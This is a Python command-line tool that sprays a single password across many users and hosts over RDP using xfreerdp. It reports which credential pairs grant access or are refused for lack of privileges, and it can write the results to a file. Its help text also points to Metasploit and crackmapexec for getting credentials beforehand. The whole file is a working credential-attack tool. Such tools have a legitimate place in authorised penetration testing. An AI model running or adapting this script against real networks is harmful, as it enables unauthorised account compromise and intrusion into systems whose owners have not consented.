#!/usr/bin/env python3
import argparse, subprocess
from enum import Enum

parser = argparse.ArgumentParser(description='Requires freerdp2-x11. This script searches for valid RDP credentials in a network via password spraying. It requires IPs, users and the password. If the scanned hosts are part of a domain, the domain name is required as well. Try to obtain valid credentials with the metasploit module smb_login or crackmapexec, prior using this script.')
parser.add_argument('-D', '--domain', default='', help='Domain')
hosts = parser.add_mutually_exclusive_group(required=True)
hosts.add_argument('-i', '--ip_file', help='IP file')
hosts.add_argument('-I', '--ips', nargs='+', help='IPs')
users = parser.add_mutually_exclusive_group(required=True)
users.add_argument('-u', '--user-file', help='User file')
users.add_argument('-U', '--users', nargs='+', help='users')
parser.add_argument('-P', '--password', required=True, help='Password')
parser.add_argument('-o', '--output-file', help='Output file')

args = parser.parse_args()

if args.ip_file:
	with open(args.ip_file, 'r') as f:
		args.ips = f.read().splitlines()

if args.user_file:
	with open(args.user_file, 'r') as f:
		args.users = f.read().splitlines()

class RC(Enum): # ResultCode
	SUCCESS = 0
	INSUFF = 1
	AUTHERR = 2
	CONNERR = 3
	OTHER = 4

symbol = {RC.SUCCESS : '\033[92m[+]\033[0m', RC.INSUFF : '\033[33m[~]\033[0m', RC.AUTHERR : '[-]', RC.CONNERR : '\033[91m[!]\033[0m', RC.OTHER : '\033[91m[?]\033[0m'}
msg = {RC.SUCCESS : 'ACCESS GRANTED - I\'m in', RC.INSUFF : 'INSUFFICIENT PRIVILEGES', RC.AUTHERR : 'AUTHENTICATION ERROR', RC.CONNERR : 'CONNECTION ERROR', RC.OTHER : 'OTHER ERROR'}
desc = {RC.SUCCESS : 'Valid logins', RC.INSUFF : 'Insufficient privileges', RC.AUTHERR : 'Invalid logins', RC.CONNERR : 'Connection errors', RC.OTHER : 'Other errors'}
results = {RC(i) : [] for i in range(len(RC))}

def create_res_string(results):
	res_string = []
	for rc in list(RC):
		res_string.append('\n' + desc[rc] + ':')
		for result in results[rc]:
			res_string.append(' '.join(result))
	return '\n'.join(res_string).strip()

for ip in args.ips:
	for user in args.users:
		working = False
		try:
			proc = subprocess.run(['xfreerdp', '/u:' + user, '/p:' + args.password, '/d:' + args.domain, '/v:' + ip, '+auth-only', '/cert-ignore'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
		except subprocess.CalledProcessError as e:
			output = str(e.stdout + e.stderr)
			rc = RC.OTHER
			if 'ERRINFO_SERVER_INSUFFICIENT_PRIVILEGES' in output:
				rc = RC.INSUFF
			elif 'ERRCONNECT_AUTHENTICATION_FAILED' in output:
				rc = RC.AUTHERR
			elif 'ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED' in output:
				rc = RC.CONNERR

		else:
			rc = RC.SUCCESS

		print('{} {} {}:{} - {}'.format(symbol[rc], ip, user, args.password, msg[rc]))
		if rc == RC.OTHER:
			print(output)
			results[rc].append((ip, user, args.password, output))
		else:
			results[rc].append((ip, user, args.password))

res_string = create_res_string(results)
print('\n' + res_string)

if args.output_file:
	with open(args.output_file, 'w') as f:
		f.write(res_string)
